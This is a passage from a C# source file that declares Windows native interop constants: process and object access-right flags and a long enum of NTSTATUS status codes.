            PROCESS_QUERY_INFORMATION = 0x0400,
            PROCESS_QUERY_LIMITED_INFORMATION = 0x1000,
            PROCESS_SET_INFORMATION = 0x0200,
            PROCESS_SET_QUOTA = 0x0100,
            PROCESS_SUSPEND_RESUME = 0x0800,
            PROCESS_TERMINATE = 0x0001,
            PROCESS_VM_OPERATION = 0x0008,
            PROCESS_VM_READ = 0x0010,
            PROCESS_VM_WRITE = 0x0020,
            SYNCHRONIZE = 0x00100000
        }

        [Flags]
        enum ACCESS_MASK : uint
        {
            DELETE = 0x00010000,
            READ_CONTROL = 0x00020000,
            WRITE_DAC = 0x00040000,
            WRITE_OWNER = 0x00080000,
            SYNCHRONIZE = 0x00100000,
            STANDARD_RIGHTS_REQUIRED = 0x000F0000,
            STANDARD_RIGHTS_READ = 0x00020000,
            STANDARD_RIGHTS_WRITE = 0x00020000,
            STANDARD_RIGHTS_EXECUTE = 0x00020000,
            STANDARD_RIGHTS_ALL = 0x001F0000,
            SPECIFIC_RIGHTS_ALL = 0x0000FFF,
            ACCESS_SYSTEM_SECURITY = 0x01000000,
            MAXIMUM_ALLOWED = 0x02000000,
            GENERIC_READ = 0x80000000,
            GENERIC_WRITE = 0x40000000,
            GENERIC_EXECUTE = 0x20000000,
            GENERIC_ALL = 0x10000000,
            DESKTOP_READOBJECTS = 0x00000001,
            DESKTOP_CREATEWINDOW = 0x00000002,
            DESKTOP_CREATEMENU = 0x00000004,
            DESKTOP_HOOKCONTROL = 0x00000008,
            DESKTOP_JOURNALRECORD = 0x00000010,
            DESKTOP_JOURNALPLAYBACK = 0x00000020,
            DESKTOP_ENUMERATE = 0x00000040,
            DESKTOP_WRITEOBJECTS = 0x00000080,
            DESKTOP_SWITCHDESKTOP = 0x00000100,
            WINSTA_ENUMDESKTOPS = 0x00000001,
            WINSTA_READATTRIBUTES = 0x00000002,
            WINSTA_ACCESSCLIPBOARD = 0x00000004,
            WINSTA_CREATEDESKTOP = 0x00000008,
            WINSTA_WRITEATTRIBUTES = 0x00000010,
            WINSTA_ACCESSGLOBALATOMS = 0x00000020,
            WINSTA_EXITWINDOWS = 0x00000040,
            WINSTA_ENUMERATE = 0x00000100,
            WINSTA_READSCREEN = 0x00000200,
            WINSTA_ALL_ACCESS = 0x0000037F,

            SECTION_ALL_ACCESS = 0x10000000,
            SECTION_QUERY = 0x0001,
            SECTION_MAP_WRITE = 0x0002,
            SECTION_MAP_READ = 0x0004,
            SECTION_MAP_EXECUTE = 0x0008,
            SECTION_EXTEND_SIZE = 0x0010
        };

        [Flags]
        public enum NTSTATUS : uint
        {
            // Success
            Success = 0x00000000,
            Wait0 = 0x00000000,
            Wait1 = 0x00000001,
            Wait2 = 0x00000002,
            Wait3 = 0x00000003,
            Wait63 = 0x0000003f,
            Abandoned = 0x00000080,
            AbandonedWait0 = 0x00000080,
            AbandonedWait1 = 0x00000081,
            AbandonedWait2 = 0x00000082,
            AbandonedWait3 = 0x00000083,
            AbandonedWait63 = 0x000000bf,
            UserApc = 0x000000c0,
            KernelApc = 0x00000100,
            Alerted = 0x00000101,
            Timeout = 0x00000102,
            Pending = 0x00000103,
            Reparse = 0x00000104,
            MoreEntries = 0x00000105,
            NotAllAssigned = 0x00000106,
            SomeNotMapped = 0x00000107,
            OpLockBreakInProgress = 0x00000108,
            VolumeMounted = 0x00000109,
            RxActCommitted = 0x0000010a,
            NotifyCleanup = 0x0000010b,
            NotifyEnumDir = 0x0000010c,
            NoQuotasForAccount = 0x0000010d,
            PrimaryTransportConnectFailed = 0x0000010e,
            PageFaultTransition = 0x00000110,
            PageFaultDemandZero = 0x00000111,
            PageFaultCopyOnWrite = 0x00000112,
            PageFaultGuardPage = 0x00000113,
            PageFaultPagingFile = 0x00000114,
            CrashDump = 0x00000116,
            ReparseObject = 0x00000118,
            NothingToTerminate = 0x00000122,
            ProcessNotInJob = 0x00000123,
            ProcessInJob = 0x00000124,
            ProcessCloned = 0x00000129,
            FileLockedWithOnlyReaders = 0x0000012a,
            FileLockedWithWriters = 0x0000012b,

            // Informational
            Informational = 0x40000000,
            ObjectNameExists = 0x40000000,
            ThreadWasSuspended = 0x40000001,
            WorkingSetLimitRange = 0x40000002,
            ImageNotAtBase = 0x40000003,
            RegistryRecovered = 0x40000009,

            // Warning
            Warning = 0x80000000,
            GuardPageViolation = 0x80000001,
            DatatypeMisalignment = 0x80000002,
            Breakpoint = 0x80000003,
            SingleStep = 0x80000004,
            BufferOverflow = 0x80000005,
            NoMoreFiles = 0x80000006,
            HandlesClosed = 0x8000000a,
            PartialCopy = 0x8000000d,
            DeviceBusy = 0x80000011,
            InvalidEaName = 0x80000013,
            EaListInconsistent = 0x80000014,
            NoMoreEntries = 0x8000001a,
            LongJump = 0x80000026,
            DllMightBeInsecure = 0x8000002b,

            // Error
            Error = 0xc0000000,
            Unsuccessful = 0xc0000001,
            NotImplemented = 0xc0000002,
            InvalidInfoClass = 0xc0000003,
            InfoLengthMismatch = 0xc0000004,
            AccessViolation = 0xc0000005,
            InPageError = 0xc0000006,
            PagefileQuota = 0xc0000007,
            InvalidHandle = 0xc0000008,
            BadInitialStack = 0xc0000009,
            BadInitialPc = 0xc000000a,
            InvalidCid = 0xc000000b,
            TimerNotCanceled = 0xc000000c,
            InvalidParameter = 0xc000000d,
            NoSuchDevice = 0xc000000e,
            NoSuchFile = 0xc000000f,
            InvalidDeviceRequest = 0xc0000010,
            EndOfFile = 0xc0000011,
            WrongVolume = 0xc0000012,
            NoMediaInDevice = 0xc0000013,
            NoMemory = 0xc0000017,
            ConflictingAddresses = 0xc0000018,
            NotMappedView = 0xc0000019,
            UnableToFreeVm = 0xc000001a,
            UnableToDeleteSection = 0xc000001b,
            IllegalInstruction = 0xc000001d,
            AlreadyCommitted = 0xc0000021,
            AccessDenied = 0xc0000022,
            BufferTooSmall = 0xc0000023,
            ObjectTypeMismatch = 0xc0000024,
            NonContinuableException = 0xc0000025,
            BadStack = 0xc0000028,
            NotLocked = 0xc000002a,
            NotCommitted = 0xc000002d,
            InvalidParameterMix = 0xc0000030,
            ObjectNameInvalid = 0xc0000033,
            ObjectNameNotFound = 0xc0000034,
            ObjectNameCollision = 0xc0000035,
            ObjectPathInvalid = 0xc0000039,
            ObjectPathNotFound = 0xc000003a,
            ObjectPathSyntaxBad = 0xc000003b,
            DataOverrun = 0xc000003c,
            DataLate = 0xc000003d,
            DataError = 0xc000003e,
            CrcError = 0xc000003f,
            SectionTooBig = 0xc0000040,
            PortConnectionRefused = 0xc0000041,
            InvalidPortHandle = 0xc0000042,
            SharingViolation = 0xc0000043,
            QuotaExceeded = 0xc0000044,
            InvalidPageProtection = 0xc0000045,
            MutantNotOwned = 0xc0000046,
            SemaphoreLimitExceeded = 0xc0000047,
            PortAlreadySet = 0xc0000048,
            SectionNotImage = 0xc0000049,
            SuspendCountExceeded = 0xc000004a,
            ThreadIsTerminating = 0xc000004b,
            BadWorkingSetLimit = 0xc000004c,
            IncompatibleFileMap = 0xc000004d,
            SectionProtection = 0xc000004e,
            EasNotSupported = 0xc000004f,
            EaTooLarge = 0xc0000050,
            NonExistentEaEntry = 0xc0000051,
            NoEasOnFile = 0xc0000052,
            EaCorruptError = 0xc0000053,
            FileLockConflict = 0xc0000054,
            LockNotGranted = 0xc0000055,
            DeletePending = 0xc0000056,
            CtlFileNotSupported = 0xc0000057,
            UnknownRevision = 0xc0000058,
            RevisionMismatch = 0xc0000059,
            InvalidOwner = 0xc000005a,
            InvalidPrimaryGroup = 0xc000005b,
            NoImpersonationToken = 0xc000005c,
            CantDisableMandatory = 0xc000005d,
            NoLogonServers = 0xc000005e,
            NoSuchLogonSession = 0xc000005f,
            NoSuchPrivilege = 0xc0000060,
            PrivilegeNotHeld = 0xc0000061,
            InvalidAccountName = 0xc0000062,
            UserExists = 0xc0000063,
            NoSuchUser = 0xc0000064,
            GroupExists = 0xc0000065,
            NoSuchGroup = 0xc0000066,
            MemberInGroup = 0xc0000067,
            MemberNotInGroup = 0xc0000068,
            LastAdmin = 0xc0000069,
            WrongPassword = 0xc000006a,
            IllFormedPassword = 0xc000006b,
            PasswordRestriction = 0xc000006c,
            LogonFailure = 0xc000006d,
            AccountRestriction = 0xc000006e,
            InvalidLogonHours = 0xc000006f,
            InvalidWorkstation = 0xc0000070,
            PasswordExpired = 0xc0000071,
            AccountDisabled = 0xc0000072,
            NoneMapped = 0xc0000073,
            TooManyLuidsRequested = 0xc0000074,
            LuidsExhausted = 0xc0000075,
            InvalidSubAuthority = 0xc0000076,
            InvalidAcl = 0xc0000077,
            InvalidSid = 0xc0000078,
            InvalidSecurityDescr = 0xc0000079,
            ProcedureNotFound = 0xc000007a,
            InvalidImageFormat = 0xc000007b,
            NoToken = 0xc000007c,
            BadInheritanceAcl = 0xc000007d,
            RangeNotLocked = 0xc000007e,
            DiskFull = 0xc000007f,
            ServerDisabled = 0xc0000080,
            ServerNotDisabled = 0xc0000081,
            TooManyGuidsRequested = 0xc0000082,
            GuidsExhausted = 0xc0000083,
            InvalidIdAuthority = 0xc0000084,
            AgentsExhausted = 0xc0000085,
            InvalidVolumeLabel = 0xc0000086,
            SectionNotExtended = 0xc0000087,
            NotMappedData = 0xc0000088,
            ResourceDataNotFound = 0xc0000089,
            ResourceTypeNotFound = 0xc000008a,
            ResourceNameNotFound = 0xc000008b,
            ArrayBoundsExceeded = 0xc000008c,
            FloatDenormalOperand = 0xc000008d,
            FloatDivideByZero = 0xc000008e,
            FloatInexactResult = 0xc000008f,
            FloatInvalidOperation = 0xc0000090,
            FloatOverflow = 0xc0000091,
            FloatStackCheck = 0xc0000092,
            FloatUnderflow = 0xc0000093,
            IntegerDivideByZero = 0xc0000094,
            IntegerOverflow = 0xc0000095,
            PrivilegedInstruction = 0xc0000096,
            TooManyPagingFiles = 0xc0000097,
            FileInvalid = 0xc0000098,
            InsufficientResources = 0xc000009a,
            InstanceNotAvailable = 0xc00000ab,
            PipeNotAvailable = 0xc00000ac,
            InvalidPipeState = 0xc00000ad,
            PipeBusy = 0xc00000ae,
            IllegalFunction = 0xc00000af,
            PipeDisconnected = 0xc00000b0,
            PipeClosing = 0xc00000b1,
            PipeConnected = 0xc00000b2,
            PipeListening = 0xc00000b3,
            InvalidReadMode = 0xc00000b4,
            IoTimeout = 0xc00000b5,
            FileForcedClosed = 0xc00000b6,
            ProfilingNotStarted = 0xc00000b7,
            ProfilingNotStopped = 0xc00000b8,
            NotSameDevice = 0xc00000d4,
            FileRenamed = 0xc00000d5,
            CantWait = 0xc00000d8,
            PipeEmpty = 0xc00000d9,
            CantTerminateSelf = 0xc00000db,
            InternalError = 0xc00000e5,
            InvalidParameter1 = 0xc00000ef,
            InvalidParameter2 = 0xc00000f0,
            InvalidParameter3 = 0xc00000f1,
            InvalidParameter4 = 0xc00000f2,
            InvalidParameter5 = 0xc00000f3,
            InvalidParameter6 = 0xc00000f4,
            InvalidParameter7 = 0xc00000f5,
            InvalidParameter8 = 0xc00000f6,
            InvalidParameter9 = 0xc00000f7,
            InvalidParameter10 = 0xc00000f8,
            InvalidParameter11 = 0xc00000f9,
            InvalidParameter12 = 0xc00000fa,
            ProcessIsTerminating = 0xc000010a,
            MappedFileSizeZero = 0xc000011e,
            TooManyOpenedFiles = 0xc000011f,
            Cancelled = 0xc0000120,
            CannotDelete = 0xc0000121,
            InvalidComputerName = 0xc0000122,
            FileDeleted = 0xc0000123,
            SpecialAccount = 0xc0000124,
            SpecialGroup = 0xc0000125,
            SpecialUser = 0xc0000126,
            MembersPrimaryGroup = 0xc0000127,
            FileClosed = 0xc0000128,
            TooManyThreads = 0xc0000129,
            ThreadNotInProcess = 0xc000012a,
            TokenAlreadyInUse = 0xc000012b,
            PagefileQuotaExceeded = 0xc000012c,
            CommitmentLimit = 0xc000012d,
            InvalidImageLeFormat = 0xc000012e,
            InvalidImageNotMz = 0xc000012f,
            InvalidImageProtect = 0xc0000130,
            InvalidImageWin16 = 0xc0000131,
            LogonServer = 0xc0000132,
            DifferenceAtDc = 0xc0000133,
            SynchronizationRequired = 0xc0000134,
            DllNotFound = 0xc0000135,
            IoPrivilegeFailed = 0xc0000137,
            OrdinalNotFound = 0xc0000138,
            EntryPointNotFound = 0xc0000139,
            ControlCExit = 0xc000013a,
            InvalidAddress = 0xc0000141,
            PortNotSet = 0xc0000353,
            DebuggerInactive = 0xc0000354,
            CallbackBypass = 0xc0000503,
            PortClosed = 0xc0000700,
            MessageLost = 0xc0000701,
            InvalidMessage = 0xc0000702,
            RequestCanceled = 0xc0000703,
            RecursiveDispatch = 0xc0000704,
            LpcReceiveBufferExpected = 0xc0000705,
            LpcInvalidConnectionUsage = 0xc0000706,
            LpcRequestsNotAllowed = 0xc0000707,
            ResourceInUse = 0xc0000708,
            ProcessIsProtected = 0xc0000712,
            VolumeDirty = 0xc0000806,
            FileCheckedOut = 0xc0000901,
            CheckOutRequired = 0xc0000902,
            BadFileType = 0xc0000903,
            FileTooLarge = 0xc0000904,
            FormsAuthRequired = 0xc0000905,
            VirusInfected = 0xc0000906,
            VirusDeleted = 0xc0000907,
            TransactionalConflict = 0xc0190001,
            InvalidTransaction = 0xc0190002,
            TransactionNotActive = 0xc0190003,
            TmInitializationFailed = 0xc0190004,
            RmNotActive = 0xc0190005,
            RmMetadataCorrupt = 0xc0190006,
            TransactionNotJoined = 0xc0190007,
            DirectoryNotRm = 0xc0190008,
            CouldNotResizeLog = 0xc0190009,
            TransactionsUnsupportedRemote = 0xc019000a,
            LogResizeInvalidSize = 0xc019000b,
            RemoteFileVersionMismatch = 0xc019000c,
            CrmProtocolAlreadyExists = 0xc019000f,
            TransactionPropagationFailed = 0xc0190010,
            CrmProtocolNotFound = 0xc0190011,
            TransactionSuperiorExists = 0xc0190012,
            TransactionRequestNotValid = 0xc0190013,
            TransactionNotRequested = 0xc0190014,
            TransactionAlreadyAborted = 0xc0190015,
            TransactionAlreadyCommitted = 0xc0190016,
            TransactionInvalidMarshallBuffer = 0xc0190017,
            CurrentTransactionNotValid = 0xc0190018,
            LogGrowthFailed = 0xc0190019,
            ObjectNoLongerExists = 0xc0190021,
            StreamMiniversionNotFound = 0xc0190022,
            StreamMiniversionNotValid = 0xc0190023,
            MiniversionInaccessibleFromSpecifiedTransaction = 0xc0190024,
            CantOpenMiniversionWithModifyIntent = 0xc0190025,
            CantCreateMoreStreamMiniversions = 0xc0190026,
            HandleNoLongerValid = 0xc0190028,
            NoTxfMetadata = 0xc0190029,
            LogCorruptionDetected = 0xc0190030,
            CantRecoverWithHandleOpen = 0xc0190031,
            RmDisconnected = 0xc0190032,
            EnlistmentNotSuperior = 0xc0190033,
            RecoveryNotNeeded = 0xc0190034,
            RmAlreadyStarted = 0xc0190035,
            FileIdentityNotPersistent = 0xc0190036,
            CantBreakTransactionalDependency = 0xc0190037,
            CantCrossRmBoundary = 0xc0190038,
            TxfDirNotEmpty = 0xc0190039,
            IndoubtTransactionsExist = 0xc019003a,
            TmVolatile = 0xc019003b,
            RollbackTimerExpired = 0xc019003c,
            TxfAttributeCorrupt = 0xc019003d,
            EfsNotAllowedInTransaction = 0xc019003e,
            TransactionalOpenNotAllowed = 0xc019003f,
            TransactedMappingUnsupportedRemote = 0xc0190040,
            TxfMetadataAlreadyPresent = 0xc0190041,
            TransactionScopeCallbacksNotSet = 0xc0190042,
            TransactionRequiredPromotion = 0xc0190043,
            CannotExecuteFileInTransaction = 0xc0190044,
            TransactionsNotFrozen = 0xc0190045,

            MaximumNtStatus = 0xffffffff
        }
    }
}

